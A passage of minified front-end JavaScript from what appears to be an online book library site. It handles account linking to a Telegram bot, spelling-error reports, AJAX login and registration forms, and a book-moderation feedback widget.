t?document.querySelector(t):t,[r,o]=[i(t),i(e)],s=document.createElement("div");s.classList.add("modal-envelop"),s.styles={display:"none",position:"fixed",top:"0",left:"0",justifyContent:"center",alignItems:"center",width:"100vw",height:"100vh"},s.appendChild(r),document.body.appendChild(s),o.addEventListener(n,(()=>{s.styles.display="none"===s.styles.display?"flex":"none"}))}const isBookDownloaded=t=>{if(!window.localStorage)return void console.error("Browser does not support localStorage feature.");const e=JSON.parse(localStorage.getItem("downloadedBooks"));return null!=e&&!!e.find((e=>e.id===t))},assignTrumbowygEditor=(t,e,n)=>{t.trumbowyg({semantic:!1,btns:[["strong","em","i","underline"],["removeformat"],["fullscreen"]]});new MutationObserver((()=>{const t="number"==typeof n?n:65535,i=$(".trumbowyg-editor");let r={html:i.html(),text:i.text()};return()=>{const n={html:i.html(),text:i.text()};n.text.length>t&&r.text.length<=t&&(i.html(subByWordsHTML(n,t-1)+"&hellip;"),(new StorybookNotify).error(i18next.t("Your description is too long. Maximum description length is {{charsMaxDescriptionLength}} characters.",{charsMaxDescriptionLength:t}))),r=n,"function"==typeof e&&e(i.html())}})()).observe($(".trumbowyg-editor")[0],{childList:!0,subtree:!0,characterData:!0})},substringHTML=(t,e,n)=>{if(n=n||t.text.length,(e=e||0)>=t.text.length)return"";let i="",r=0,o=!1;[...t.html].forEach((t=>{"<"==t&&(o=!0),(o||e<=r&&r<e+n)&&(i+=t),r+=o?0:1,">"==t&&(o=!1)}));let s="";do{s=i.replace(/<(\w+)[^>]*>(<br>)+<\/\1>/,"").replace(/<(\w+)[^>]*><\/\1>/,"")}while(i!=s&&(i=s));return i};function subByWordsHTML(t,e,n){if(t.text.length<e)return t.html;let i,r=-1;do{i=r,r=t.text.indexOf(" ",++r)}while(-1!=r&&r<e);return substringHTML(t,0,-1==i?e:i)}function updateDescriptionLength(t){t=t||2e3;const e=$(".trumbowyg-editor").text().length,n=$(".trumbowyg-box").parent().find("#description-length");n.text(`${e}/${t}`),e>=t&&(n.addClass("description-block__length_exceed"),setTimeout((()=>n.removeClass("description-block__length_exceed")),3e3))}function hideBanner(t){const e="hide_"+t+"_announcement",n=$("#"+t+"Banner");n.animate({height:0,opacity:0,"padding-top":0,"padding-bottom":0,"margin-bottom":0},"slow",(function(){n.remove()})),setCookie(e,1,26784e5)}function getCurrentUserId(){const t=parseInt(CurrentUser.id);return isNaN(t)?null:t}function getTelegramBindingStatusFromLocalStorage(){if(!window.localStorage)return null;const t=getCurrentUserId();if(!t)return null;const e=parseInt(localStorage.getItem("tgBindingUser"));return isNaN(e)?null:e===t}function setTelegramBindingStatusToLocalStorage(t){if(!window.localStorage||void 0===t)return;const e=getCurrentUserId();null!==t&&e?localStorage.setItem("tgBindingUser",t?e:-1*e):localStorage.removeItem("tgBindingUser")}function doLoadTelegramBindingStatus(){const t=$(".tg-form"),e=$("#tgStatusConnectionError"),n=$("#tgStatusLoading"),i=getTelegramBindingStatusFromLocalStorage();if(null!==i)return changeTelegramDivDisplay(i),n.remove(),void t.show();new StorybookResponse("/papi/user/telegram/pinned").success((i=>{n.remove(),i.connectError?e.show():(changeTelegramDivDisplay(i.isPinned),t.show())})).error((t=>{n.remove()})).fetch()}function generateTelegramHash(t){const e=$(t);e.attr("disabled","disabled").addClass("disabled"),setTelegramBindingStatusToLocalStorage(null);const n=new StorybookSpinner(e).color("#D9D9D9");new StorybookResponse("/papi/user/telegram/hash").spinner(n).success((t=>{if(e.find(".spinner").remove(),e.removeAttr("disabled").removeClass("disabled"),!t.connectError)return t.bot&&t.hash?createTelegramConnectModal(t.bot,t.hash):void StorybookNotify().info(t.message);(new StorybookNotify).error(i18next.t("Connection timeout. Please try again later."))})).error((t=>{e.removeAttr("disabled").removeClass("disabled")})).fetch()}function createTelegramConnectModal(t,e){const n=$("#tg-connect-modal");if(n.data("bot",t),n.data("hash",e),n.data("init"))return $(".tg-connect-modal-content .tg-bot-login").val("@"+t),$(".tg-connect-modal-content .tg-bot-command").val("/start "+e),void $("#Storybook-modal-styled").modal("show");n.data("init",1),new StorybookModal({container:"Storybook-modal-styled",element:"tg-connect-modal",title:"How to access the bot",width:500,afterRender:function(){$(".tg-connect-modal-content .tg-bot-login").val("@"+n.data("bot")),$(".tg-connect-modal-content .tg-bot-command").val("/start "+n.data("hash")),$(".modal #startTelegram").click((()=>{openTelegramApp(n.data("bot"),n.data("hash")),$("#Storybook-modal-styled").modal("hide")})),$(document).on("hidden.bs.modal",(function(){checkTelegramUserBinding()}))}}).show(),$(".modal").on("shown",centerModal)}function openTelegramApp(t,e){t&&(e=void 0!==e?"?start="+e:"",window.location.href="https://t.me/"+t+e)}function checkTelegramUserBinding(){if(!$("#isPinned").length||$("#isPinned").is(":visible"))return;let t=5e3;if(window.checkTelegramUserBindingCounter=window.checkTelegramUserBindingCounter?window.checkTelegramUserBindingCounter+1:1,window.checkTelegramUserBindingCounter<5)t=2e3;else if(window.checkTelegramUserBindingCounter>10)return void(window.checkTelegramUserBindingCounter=0);new StorybookResponse("/papi/user/telegram/pinned").success((e=>{if(!0===e.isPinned){if($("#isPinned").is(":visible"))return;changeTelegramDivDisplay(!0),window.checkTelegramUserBindingCounter=0,window.TelegramPinned=!0,StorybookNotify().success(i18next.t("Your account has been successfully connected to Telegram!"))}else e.connectError?window.location.reload():setTimeout((function(){checkTelegramUserBinding()}),t)})).fetch()}function updateTelegramBindingStatus(){if(void 0!==window.TelegramPinned)return;const t=getTelegramBindingStatusFromLocalStorage();null===t?new StorybookResponse("/papi/user/telegram/pinned").success((t=>{t.connectError||t.error||(setTelegramBindingStatusToLocalStorage(t.isPinned),window.TelegramPinned=t.isPinned)})).fetch():window.TelegramPinned=t}function loadTelegramBotName(){"string"!=typeof window.TelegramBotName&&(window.localStorage&&(window.TelegramBotName=localStorage.getItem("TelegramBotName"))||new StorybookResponse("/papi/user/telegram/botname").success((t=>{window.TelegramBotName=t.bot,window.localStorage&&localStorage.setItem("TelegramBotName",t.bot)})).fetch())}function changeTelegramDivDisplay(t){const e=$("#isNotPinned"),n=$("#isPinned");e.length&&n.length&&(e.css("display",t?"none":"block"),n.css("display",t?"block":"none"),setTelegramBindingStatusToLocalStorage(t))}function removeTelegramUserBinding(t){const e=$(t);e.attr("disabled","disabled");const n=new Request("/papi/user/telegram/binding",{method:"DELETE"}),i=new StorybookSpinner(e).color("#D9D9D9");setTelegramBindingStatusToLocalStorage(null),new StorybookResponse(n).spinner(i).success((t=>{e.removeAttr("disabled"),t.connectError?(new StorybookNotify).error(i18next.t("Connection timeout. Please try again later.")):200===t.code?(window.TelegramPinned=!1,changeTelegramDivDisplay(!1),StorybookNotify().success(i18next.t("Your account has been disconnected from Telegram!"))):(StorybookNotify().info(t.message),doLoadTelegramBindingStatus())})).error((t=>{e.removeAttr("disabled")})).fetch()}function centerModal(){document.documentElement.clientWidth>768||($(".modal[style*='block']  .modal-dialog ").css("transition","top 0.3s ease"),$(".modal[style*='block']  .modal-dialog ").css("top",0),$(".modal[style*='block']  .modal-dialog ").css("top",Math.max((document.documentElement.clientHeight-$(".modal[style*='block']  .modal-dialog ").height())/2,0)+"px"))}!function(){function t(){var t=.01*window.innerHeight;document.documentElement.style.setProperty("--vh",`${t}px`)}t(),window.addEventListener("resize",t)}(),$("document").ready((()=>{CurrentUser.id&&(updateTelegramBindingStatus(),loadTelegramBotName(),$(".footer__button_telegram").click((()=>{!0===window.TelegramPinned?openTelegramApp(window.TelegramBotName):generateTelegramHash(".footer__button_telegram")})))}));const Spelling=function(){this.modalConteinerID="Storybook-modal-styled",this.modalElementID="spelling_modal_windows",this.runOnKeys=function(t){document.addEventListener("keydown",(e=>{const n=$(e.target);n.hasClass("modal")||"FORM"==n.prop("tagName")||n.closest(".modal, form").length||"Enter"===e.code&&e.ctrlKey&&t()}))},this.runSelectText=()=>{const t=window.getSelection().toString().trim();if(!t.length)return;const e=window.getSelection().anchorNode.parentElement;if(window.getSelection().empty(),!CurrentUser.isAuth()){return $(e).closest(".singlelogin").length||CurrentUser.showAuthPopup("login",i18next.t("After authorization, you will be able to use this function")),!1}if(!$(e).closest("[data-spelling]").length&&!$(e).hasClass("property_label")){let t=$(e).closest("[data-spelling-suggest]");if(t.length){let e=t.attr("data-book_id");if(e){return void new Book({id:e}).suggestModal()}}if($(e).closest("[data-no-spelling]").length)return}this.renderModalElement(t),this.reportModal()},this.reportModal=()=>{const t=$("#"+this.modalConteinerID+" .modal-dialog");this.modal=new StorybookModal({container:this.modalConteinerID,element:this.modalElementID,title:i18next.t("Report about the spelling error"),width:600,removeSource:!0,afterRender:function(){$(document).on("shown.bs.modal",(function(){$("#descriptionError").focus();const e=parseInt(window.innerHeight/2-t.height()/2-30);t.animate({top:(e>0?e:0)+"px"},{queue:!1,duration:500}).animate({opacity:1},{queue:!1,duration:300})}))}}),t.css("opacity",0),this.modal.show()},this.submitError=t=>{const e=new StorybookSpinner("spellingFormSubmit"),n=new Request("/papi/spelling/set",{method:"POST",body:t});return new StorybookResponse(n).spinner(e).success((t=>{StorybookNotify().info(i18next.t("Thank you for reporting a problem!")+"<br>"+i18next.t("We will check this page soon"))})).fetch()},this.renderModalElement=t=>{$("#"+this.modalElementID).remove();const e=this,n=$('<div id="'+this.modalElementID+'" class="hidden">');n.append('<form role="form"><input type="hidden" name="text" value="'+t+'"><input type="hidden" name="url" value="'+document.location.href+'"><div class="spelling-selected-title">'+i18next.t("Error text:",{nsSeparator:!1,keySeparator:!1})+'&nbsp;<span class="spelling-selected-text">'+t+'</span></div><div class="spelling-description-title"><span style="color: red;">*</span>'+i18next.t("Correct the error or suggest a solution")+'</div><div class="spelling-description-text"><textarea class="form-control" id="descriptionError"></textarea></div></form><div class="modal-footer"><button class="btn-cancel">'+i18next.t("Cancel")+'</button><button type="submit" class="btn-primary" disabled id="spellingFormSubmit">'+i18next.t("Submit")+"</button></div>"),$("body").append(n).on("click.spelling","#spellingFormSubmit",(function(t){if(t.preventDefault(),!$("#descriptionError").val().trim().length)return StorybookNotify().error(i18next.t("Fill in the fields marked with an *.")),!1;const i=$("form",n).serialize()+"&description="+encodeURI($("#descriptionError").val());e.submitError(i),e.modal.hide(),$("body").off(".spelling")})).on("click.spelling",".btn-cancel",(function(t){e.modal.hide()})).on("keyup.spelling change.spelling","#descriptionError",(function(){$("#spellingFormSubmit").prop("disabled",!$(this).val().trim().length)}))},this.runOnKeys(this.runSelectText)};new Spelling;const AuthForm=function(){const t=new WeakMap,e={isXhr:!0,modal:null},n="validation-error";function i(n){if(!(this instanceof i))throw new TypeError("AuthForm constructor cannot be invoked without 'new'");if(!jQuery)throw new Error("This object depends on jQuery library.");if(!(n&&n instanceof HTMLFormElement))throw new TypeError("First argument must be an instance of HTMLFormElement.");if(t.has(n))return t.get(n);t.set(n,this),this.options=$.extend({},e),this.$form=$(n),this.url=this.$form.attr("action"),this.action=this.$form.data("action"),this.$target=$("iframe[name="+this.$form.attr("target")+"]"),this.$interactiveElements=this.$form.find("input:not([type=hidden]), textarea, select, button").not("[disabled]"),this.$submitButton=this.$interactiveElements.filter('[type="submit"]'),this.$validationFields=this.$form.find(".validation-field"),this.$messageElement=this.$form.find(".form-error"),this.spinner=new StorybookSpinner(this.$submitButton),this.$form.on("submit.auth",o.bind(null,this));const r=this.$form.find(".btn-show-password, .btn-hide-password"),a=this.$interactiveElements.filter(".form-control-password");r.off("click.togglePasswordMode").on("click.togglePasswordMode",s.bind(null,r,a))}var r=i.prototype;function o(t,e){return t.block(),t.$validationFields.removeClass(n),t.$messageElement.text(""),t.options.isXhr?(e.preventDefault(),function(t){const e=t.getData();$.RPC(t.action,e).done((function(i){const r=i.response;if("object"==typeof r&&null!==r){if(r.validationError){if(t.unblock(),"object"==typeof r.fields)for(let e=0,i=r.fields.length;e<i;e++)t.$validationFields.filter('[name="'+r.fields[e]+'"]').addClass(n);return void("string"==typeof r.message&&(t.$messageElement.length?t.$messageElement.html(r.message):(new StorybookNotify).error(r.message)))}if("passwordrecovery"===t.action){const t=$(".pwd-sended");if(t.length)return void $(".well").html(t.html())}if("login"===t.action&&"string"==typeof r.priorityRedirectUrl)return void redirectWithCounting("auth",r.priorityRedirectUrl);if("registration"===t.action&&"string"==typeof r.redirectFromModal)return void(window.location.href=r.redirectFromModal);if("login"===t.action||"registration"===t.action){const t=e.site_mode,n="articles"===t?$("#selectArticlesDomain"):$("#selectBooksDomain");$(".well").hide(),$(".login-success").show();const i=function(t){const e=setInterval((function(){const i=!!n.length&&n.val();if(!1!==i&&"false"!==i){if(i.length)return clearInterval(e),void redirectWithCounting("auth","//"+i+r.params)}else if(clearInterval(e),$(".well").hide(),$(".no-available-domains").show(),t){const e=$(".well.no-available-domains .errorCode .val");e.text(e.text()+t)}}),1e3)};return"articles"!==t&&r.priorityHosts?void DomainsChecker(r.priorityHosts,(function(t){redirectWithCounting("auth","//"+t+r.params)}),(function(t){noDomainAvailableLog({country:Config.Country,domains:t},(function(t){i(t.code)}))}),"books",!0):void i()}}if("passwordrecovery"===t.action)return $("#auth_modal_passwordrecovery").hide(),void $("#auth_modal_passwordrecovery_sended").show();t.options.modal&&t.options.modal.hide(),setTimeout((function(){window.location.reload()}),300)})).fail((function(e,n){t.unblock();var i=i18next.t("Something went wrong");n&&n.errors&&(i=n.errors.message()),(new StorybookNotify).error(i)}))}(t),!1):(t.$target.one("load.auth",(function(){t.unblock()})),!0)}function s(t,e){t.toggleClass("hidden"),e.attr("type","password"===e.attr("type")?"text":"password")}return r.useXhr=function(t){return this.options.isXhr=!!t,this},r.setModal=function(t){if(!(t instanceof StorybookModal))throw new TypeError("Modal object must be an instance of StorybookModal");return this.options.modal=t,this},r.block=function(){return this.spinner.start(),setTimeout((()=>{this.$interactiveElements.prop("disabled",!0)}),0),this},r.unblock=function(){return this.spinner.stop(),this.$interactiveElements.prop("disabled",!1),this},r.getData=function(){return this.$form.serializeArray().reduce((function(t,e){return t[e.name]=e.value,t}),{isModal:this.options.isXhr})},r.submit=function(){return this.$form.trigger("submit.auth"),this},i}();function clearSearchButtonToggle(t,e){$(t).val()?$(e).css("display","block"):$(e).css("display","none")}function clearSearchButtonEvents(t,e){clearSearchButtonToggle(t,e),$(t).on("input",(()=>clearSearchButtonToggle(t,e))),$(e).click((()=>$(t).val("").trigger("input")))}class ZModerationBlock{static get availableRoles(){return{bookModeration:0,bookIssueFeedback:1}}static get availableTypes(){return{touch:0,desktop:1}}static get availableEventHandlers(){return{onOpen:0,onDeclined:1,onAccepted:2,beforeSetNegativeAnswer:3,afterSetNegativeAnswer:4,afterUnsetNegativeAnswer:5,onRatingSelect:6}}constructor({type:t,containerSelector:e,initiatorSelector:n,isFixed:i,maxCommentLength:r,role:o,eventHandlers:s,opts:a}){switch(this.type=null!==t?t:ZModerationBlock.availableTypes.desktop,this.$container=$(e),this.$moderationBlock=this.$container.hasClass("z-moderation-block")?this.$container:this.$container.find(".z-moderation-block"),this.$initiator=$(n),this.isFixed=i||!1,this.charsMaxCommentLength=r||64,this.role=o||ZModerationBlock.availableRoles.bookModeration,this.eventHandlers=s&&"object"==typeof s?Object.fromEntries(Object.entries(s).filter((([t])=>t in ZModerationBlock.availableEventHandlers))):{},this.opts=a||{},this.setState("closed"),this.type){case ZModerationBlock.availableTypes.touch:this.$moderationBlock.find(".questions_slider").remove(),this.backupLabelText=this.$moderationBlock.find(".z-moderation-block__header").text();break;case ZModerationBlock.availableTypes.desktop:this.$trianglePointer=this.$moderationBlock.find(".questions_pointer_triangle")}this.isFixed&&this.arrangeBackdrop(),this.$commentBlock=this.$moderationBlock.find(".moderation-comment-block_purpose_questions"),this.helpQuestionName="",this.lastTargetedControl=null,this.$negativeAnsweredQuestion=null,this.actionsChain={pre_action:[],action:[],post_action:[]};const l=this.$moderationBlock.find(".stars");l.length&&(this.ratingWidget=new RatingContainer({containerSelector:l,ratingItemSelector:".star"})),this.setListeners(),this.applyRole()}setState(t){this.state=t}arrangeBackdrop(){this.$envelop=$(document.createElement("div")),this.$envelop.addClass("z-moderation-block__backdrop-envelop"),this.$moderationBlock.after(this.$envelop),this.$envelop.append(this.$moderationBlock)}arrayPromisify(t){return t.length>0?t.map((t=>new Promise((async e=>e(await t()))))):[!0]}async setPlaceholderElement(){const t=this.$moderationBlock.innerHeight();this.$placeholderElement=$(document.createElement("div")),this.$placeholderElement.css("height","1px"),this.$placeholderElement.css("transition","height .4s"),this.$moderationBlock.before(this.$placeholderElement),await new Promise((t=>{setTimeout((()=>t(!0)),0)})),this.$placeholderElement.css("height",t+"px"),await new Promise((t=>{this.$placeholderElement.on("transitionend",(()=>{this.$placeholderElement.off("transitionend"),t(!0)}))}))}async destroyPlaceholderElement(){this.$placeholderElement.css("height","1px"),await new Promise((t=>{this.$placeholderElement.on("transitionend",(()=>{this.$placeholderElement.off("transitionend"),t(!0)}))})),this.$placeholderElement.remove()}async utilizeActionsChain(){const{pre_action:t,action:e,post_action:n}=this.actionsChain;this.actionsChain={pre_action:[],action:[],post_action:[]},await Promise.all(this.arrayPromisify(t)),await Promise.all(this.arrayPromisify(e)),await Promise.all(this.arrayPromisify(n))}async initialize(){const t=this.$moderationBlock.find(".questions-table__question:first-of-type")[0];this.$moderationBlock.find('[data-toggle="moderation-block-tooltip"]').tooltip({container:"body",trigger:"hover"});await this.open(),(()=>{const e=t.offsetHeight+10;this.$commentBlock.css("top",e+"px");const n=this.$commentBlock.find(".send-button-envelop");n.tooltip({title:i18next.t("Your comment is too long. Maximum comment length is {{charsMaxCommentLength}} characters.",{charsMaxCommentLength:this.charsMaxCommentLength}),trigger:"hover"}),n.tooltip("disable")})()}applyRole(){const t=this.$moderationBlock.find(".z-moderation-block__header");switch(this.role){case ZModerationBlock.availableRoles.bookModeration:if(this.eventHandlers.onSubmit)return;this.eventHandlers.onSubmit=t=>{const e=this.$moderationBlock.data("book_id");new StorybookResponse(`/papi/moderation/user-book-moderation/${e}`,t).fetch()};break;case ZModerationBlock.availableRoles.bookIssueFeedback:this.$moderationBlock.find(".question__control__good").siblings("input").prop("checked","checked").trigger("change");const e=this.$moderationBlock.find(".moderation-comment-block_purpose_general"),n=this.$moderationBlock.find("form");n.prop("id",n.prop("id")+Date.now());const i=e.find('button[type="submit"]');i.attr("form",n.prop("id"));const r=i.parents(".send-button-envelop");if(r.tooltip({title:i18next.t("Your comment is too long. Maximum comment length is {{charsMaxCommentLength}} characters.",{charsMaxCommentLength:this.charsMaxCommentLength}),trigger:"hover"}),r.tooltip("disable"),this.$moderationBlock.find("#otherReportReason").click((()=>{show(e);const n=this.$moderationBlock.find(".z-moderation-block__header");n.prop("id","returnFromGeneralComment"),n.html(`<i class="zlibicon-mid-length-arrow-left"></i> ${t.html()}`),n.click((()=>{hide(e),e.find(".comment-block__textarea").val("").trigger("input"),n.find("i").remove(),n.prop("id",""),n.off("click")}))})),this.eventHandlers.onAccepted||(this.eventHandlers.onAccepted=()=>!1),this.eventHandlers.afterSetNegativeAnswer||(this.eventHandlers.afterSetNegativeAnswer=()=>{if(this.type===ZModerationBlock.availableTypes.touch){const t=this.$moderationBlock.find(".other-reason-hint");t.length&&this.actionsChain.post_action.push((()=>t.css("z-index",-1)))}}),this.eventHandlers.afterUnsetNegativeAnswer||(this.eventHandlers.afterUnsetNegativeAnswer=()=>{if(this.type===ZModerationBlock.availableTypes.touch){const t=this.$moderationBlock.find(".other-reason-hint");t.length&&this.actionsChain.post_action.push((()=>t.css("z-index",10)))}}),this.eventHandlers.onSubmit)return;this.eventHandlers.onSubmit=t=>{const e=this.$moderationBlock.data("book_id");return new StorybookResponse(`/papi/book-issues/${e}`,t).success((t=>{StorybookNotify().info(i18next.t("Thank you for reporting a problem!<br>We will check this book soon"))})).fetch()}}}async executeEventHandler(t,...e){if(this.eventHandlers[t]&&"function"==typeof this.eventHandlers[t])return await this.eventHandlers[t].call(this,...e)}async open(){if("open"===this.state)return;if(!1===await this.executeEventHandler("onOpen"))return!1;const t=this.$moderationBlock.find(".questions-table__question:first-of-type")[0];switch(this.type){case ZModerationBlock.availableTypes.desktop:this.opts.isModerationBookUpload||(await this.setPlaceholderElement(),this.$placeholderElement.css("display","none")),this.$moderationBlock.css("display","block"),this.moveTrianglePointerTo(t),this.showHelpFor(t),await show(this.$moderationBlock);break;case ZModerationBlock.availableTypes.touch:this.$moderationBlock.css("display","block")}this.isFixed&&(await show(this.$envelop),document.body.style.overflowY="hidden"),this.setState("open")}async close(){"closed"!==this.state&&(this.isFixed?(await hide(this.$envelop),document.body.style.removeProperty("overflow-y")):(await hide(this.$moderationBlock),this.$moderationBlock.css("display","none"),this.$placeholderElement.css("display","block"),await new Promise((t=>{setTimeout((()=>t(!0)),0)})),await this.destroyPlaceholderElement()),this.setState("closed"),this.reset())}reset(){this.$negativeAnsweredQuestion=null,this.actionsChain={pre_action:[],action:[],post_action:[]},this.$moderationBlock.find("[style]").filter((function(){return 0===$(this).parents("[data-not_resettable]").length})).attr("style","");const t=this.$moderationBlock.find(".questions-table__question");t.data("state",""),this.$moderationBlock.find(".moderation-comment-block textarea").val("").trigger("input");const e=this.$moderationBlock.find(".z-moderation-block__header");e.prop("id",""),e.find("*").remove();const n=t.find(".question__control");switch(this.role){case ZModerationBlock.availableRoles.bookModeration:n.siblings("input").prop("checked","");break;case ZModerationBlock.availableRoles.bookIssueFeedback:n.filter(".question__control__bad").siblings("input").prop("checked",""),n.filter(".question__control__good").siblings("input").prop("checked","checked")}}setListeners(){const t=this,e=[".question__control",".question__label"];switch($(".question__control, .question__label",t.$container).click((function(t){("locked"===$(this).parents(".questions-table__question").data("state")||$(this).siblings("input").prop("checked"))&&t.stopImmediatePropagation()})),$(".question__control",t.$container).click((async function(e){const n=$(this).parents(".questions-table__question"),i=$(this).siblings("input");if(i.prop("checked",!i.prop("checked")).trigger("change"),t.$lastTargetedControl=i,$(this).hasClass("question__control__bad")){!1===await t.setNegativeAnswer(n)&&e.stopImmediatePropagation()}else"negative"===n.data("state")&&t.unsetNegativeAnswer(n),t.isAllChecked()&&t.actionsChain.post_action.push((()=>{$(this).parents("form").submit()}))})),this.type){case ZModerationBlock.availableTypes.desktop:$(".question__control, .question__label",t.$container).click((async function(){const e=$(this).hasClass("question__control__bad")||"negative"===$(this).parents(".questions-table__question").data("state")&&!$(this).hasClass("question__control__good")?null:$(this).parents(".questions-table__question")[0];t.actionsChain.action.push((()=>t.moveTrianglePointerTo(e)))})),$(".question__control, .question__label",t.$container).click((async function(){t.actionsChain.action.push((()=>t.showHelpFor($(this).parents(".questions-table__question")[0])))}));break;case ZModerationBlock.availableTypes.touch:$(t.$container).on("click","#returnToQuestions",(async function(){t.helpSlide({direction:"to_questions"})})),e.push("#returnToQuestions"),$(".question__label",t.$container).click((async function(){t.helpSlide({questionElement:$(this).parents(".questions-table__question")[0],direction:"to_help"})}))}const n=this.role===ZModerationBlock.availableRoles.bookIssueFeedback?e=>e.length>0&&e.length<=t.charsMaxCommentLength:e=>e.length<=t.charsMaxCommentLength;if($(".comment-block__textarea",t.$container).on("input",(function(){const t=$(this).parents(".moderation-comment-block").find(".send-button-envelop");n(this.value)?(t.find("button").prop("disabled",!1),t.tooltip("disable")):(t.find("button").prop("disabled",!0),t.tooltip("enable"))})),$(".comment-block__textarea").trigger("input"),$("form#questionsForm",t.$container).on("submit",(async function(e){e.preventDefault();const n={};if(e.originalEvent&&"commentSend"===e.originalEvent.submitter.id){if($("#goBack",t.$container).css("display","none"),n.accepted=!1,$(this).find('input:checked[value="no"]').length)n.decline_reason=$(this).find('input:checked[value="no"]').siblings(".question__control").data("decline_reason");else if(t.$negativeAnsweredQuestion){const e=t.$negativeAnsweredQuestion.data("name");if("file_quality"!==e)return console.error("invalid question name: "+e),!1;n.decline_reason="unreadable"}else n.decline_reason="other";n.decline_comment=$(e.originalEvent.submitter).parents(".moderation-comment-block").find("textarea").val();const i=t.ratingWidget?t.ratingWidget.ratingScore:null;if(!1===await t.executeEventHandler("onDeclined",n.decline_reason,n.decline_comment,i))return!1}else{n.accepted=!0;if(!1===await t.executeEventHandler("onAccepted"))return!1}if(!t.opts.isModerationBookUpload){const e=-t.$container.find(".main-content > .z-step:last-of-type")[0].offsetTop;$(".z-step",t.$container).css("transform",`translateY(${e}px)`),t.executeEventHandler("onSubmit",n)}return!1})),$(".z-moderation-block__close-button",t.$container).click((async function(){t.close()})),$("#hideForDay",t.$container).click((function(){setCookie("dont_show_moderation_cards",!0,864e5),t.close()})),$("#goBack",t.$container).click((function(){t.$lastTargetedControl.prop("checked",!1).trigger("change"),$(".z-step",t.$container).css("transform","translateY(0px)")})),t.ratingWidget){e.push(".star");const n=()=>{let e=null;const n=t.$container.find('.moderation-help-box--yes .moderation-help-hint[data-question="file_quality"]'),i=t.$container.find('.moderation-help-box--no .moderation-help-hint[data-question="file_quality"]');return function(){const r=t.$container.find('.questions-table__question[data-name="file_quality"]');let o;t.actionsChain.action.push((()=>t.showHelpFor(r[0]))),1===this.ratingScore&&"negative"!==r.data("state")?(t.setNegativeAnswer(r),"desktop"===t.type&&t.actionsChain.action.push((()=>t.moveTrianglePointerTo(null)))):this.ratingScore>1&&("negative"===r.data("state")&&t.unsetNegativeAnswer(r),"desktop"===t.type&&t.actionsChain.action.push((()=>t.moveTrianglePointerTo(r[0]))),t.isAllChecked()&&t.actionsChain.post_action.push((()=>{this.$container.parents("form").submit()}))),o=1===this.ratingScore?i.find(".hint-item > span"):n.find(`.hint-item:nth-child(${this.ratingScore-1}) > span`),o!==e&&(e&&e.css("font-weight","unset"),o.css("font-weight","600"),e=o,t.executeEventHandler("onRatingSelect",this.ratingScore))}};this.ratingWidget.setSelectAction(n()),this.ratingWidget.setSelectPredicate((function(){const t=this.$ratingItems.parents(".questions-table__question").data("state");return"locked"!==t&&!("negative"===t&&1!==this.ratingScore)}))}if($(t.$container).on("click",e.join(","),(async function(){await t.utilizeActionsChain()})),t.$initiator){(e=>{const n=function(){t.initialize(),e.off("click",n),e.on("click",(()=>{"open"!==t.state&&t.open()}))};e.on("click",n)})(t.$initiator)}}isAllChecked(){return $('.questions-table input[type="radio"]',this.$moderationBlock).length/2===$('.questions-table input[type="radio"]:checked',this.$moderationBlock).length}async setNegativeAnswer(t){if(!1===await this.executeEventHandler("beforeSetNegativeAnswer",t.data("name"),t))return!1;this.$negativeAnsweredQuestion=t,t.data("state","locked");const e=t.siblings();e.data("state","locked"),this.actionsChain.pre_action.push((()=>hide(e)));const n=t[0].getBoundingClientRect().top,i=t.parents("form")[0].getBoundingClientRect().top-n;0!==i&&this.actionsChain.action.push((async()=>{const e=new Promise((e=>{t.on("transitionend",(n=>{"transform"===n.originalEvent.propertyName&&(t.off("transitionend"),e(!0))}))}));t.css("transform",`translateY(${i}px)`),await e})),this.actionsChain.post_action.push((async()=>{await show(this.$commentBlock),t.data("state","negative"),this.$commentBlock.find("textarea").focus()})),this.executeEventHandler("afterSetNegativeAnswer",t.data("name"),t)}async unsetNegativeAnswer(t){this.actionsChain.pre_action.push((()=>hide(this.$commentBlock))),"none"!==t.css("transform")&&this.actionsChain.action.push((async()=>{this.$commentBlock.find("textarea").val("").trigger("input"),t.data("state","locked"),t.css("transform",""),await new Promise((e=>{t.on("transitionend",(n=>{t.off("transitionend"),e(!0)}))}))})),this.actionsChain.post_action.push((async()=>{await show(t.siblings()),t.data("state",""),t.siblings().data("state",""),this.$negativeAnsweredQuestion=null})),this.executeEventHandler("afterUnsetNegativeAnswer",t.data("name"),t)}async moveTrianglePointerTo(t){let e=0;e=null===t?this.$moderationBlock.find(".questions-table__question:first-of-type")[0].offsetHeight/2:t.offsetTop+t.offsetHeight/2;const n=`matrix(1, 0, 0, 1, 0, ${e-this.$trianglePointer[0].clientHeight/2})`;if(this.$trianglePointer.css("transform")===n)return!0;const i=this.$trianglePointer.css("transition")?new Promise((t=>{this.$trianglePointer.on("transitionend",(()=>{this.$trianglePointer.off("transitionend"),t(!0)}))})):null;this.$trianglePointer.css("transform",n),await i}async showHelpFor(t){const e=t.dataset.name,n=$(t).parents(".z-step-start__active-part");if(this.helpQuestionName!==e){const t=this.helpQuestionName;this.helpQuestionName=e;const i=n.find(`.moderation-help-label[data-question="${this.helpQuestionName}"]`);let r=null;if(t){const o=[],s=n.find(`.moderation-help-hint[data-question="${t}"]`);o.push(s);const a=n.find(`.moderation-help-label[data-question="${t}"]`);i.text()!==a.text()?(r=!0,o.push(a)):(r=!1,a.each(((t,n)=>{n.dataset.question=e})),i.each(((e,n)=>{n.dataset.question=t})));const l=o.map((t=>hide(t)));await Promise.all(l),o.forEach((t=>t.css("display","none")))}const o=[],s=n.find(`.moderation-help-hint[data-question="${this.helpQuestionName}"]`);o.push(s),!0!==r&&null!==r||o.push(i),o.forEach((t=>t.css("display","block")));const a=o.map((t=>show(t)));await Promise.all(a)}return!0}async helpSlide({questionElement:t,direction:e}){const n={};switch(e){case"to_help":this.showHelpFor(t),n.label_id="returnToQuestions",n.label_text='<i class="zlibicon-mid-length-arrow-left"></i>'+t.querySelector(".question__label").innerText,n.pxMoveBy=-this.$moderationBlock.find(".z-step")[0].clientWidth;break;case"to_questions":n.label_id="",n.label_text=this.backupLabelText,n.pxMoveBy=0;break;default:return void console.err("helpSlide ERROR: unknown direction")}const i=[],r=this.$moderationBlock.find(".z-step-start__active-part"),o=this.$moderationBlock.find(".z-moderation-block__header");this.actionsChain.pre_action.push((async()=>{this.$moderationBlock.find(".questions-table__question").data("state","locked"),await hide(o),o.html(n.label_text),o.prop("id",n.label_id)})),i.push(r);const s=this.$moderationBlock.find(".hide-block-section");s.length&&i.push(s);const 